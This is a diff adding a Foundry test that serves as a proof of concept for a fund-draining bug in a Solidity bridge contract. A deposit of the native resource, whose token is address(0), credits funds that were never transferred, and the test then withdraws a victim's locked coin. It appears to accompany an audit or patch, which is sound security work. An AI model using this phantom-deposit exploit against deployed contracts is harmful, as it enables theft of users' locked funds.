@@ -1,0 +1,38 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+import {Test} from "forge-std/Test.sol";
+import {Czz} from "../src/Czz.sol";
+
+/// @notice PoC: passes on the ORIGINAL bridge, fails on the PATCHED one.
+///         The native resource resolves to token address(0). A low-level call to
+///         an address with no code succeeds and returns no data, so the ERC20
+///         deposit path credits a deposit that moved nothing, which the attacker
+///         then withdraws as real native coin locked by honest users.
+contract PocTest is Test {
+    Czz internal bridge;
+    address internal owner = makeAddr("owner");
+    address internal victim = makeAddr("victim");
+    address internal attacker = makeAddr("attacker");
+
+    function setUp() public {
+        vm.prank(owner);
+        bridge = new Czz();
+        vm.deal(victim, 10 ether);
+        vm.prank(victim);
+        bridge.fzzDepositNative{value: 10 ether}();
+    }
+
+    function test_phantomDepositDrainsNative() public {
+        bytes32 rid = bridge.NATIVE_RESOURCE();
+        assertEq(attacker.balance, 0);
+
+        vm.startPrank(attacker);
+        bridge.fzzDeposit(rid, 10 ether); // nothing is transferred
+        bridge.fzzWithdraw(rid, 10 ether);
+        vm.stopPrank();
+
+        assertEq(attacker.balance, 10 ether, "attacker withdrew coin it never locked");
+        assertEq(bridge.fzzTotalNative(), 0, "victim's locked coin is gone");
+    }
+}
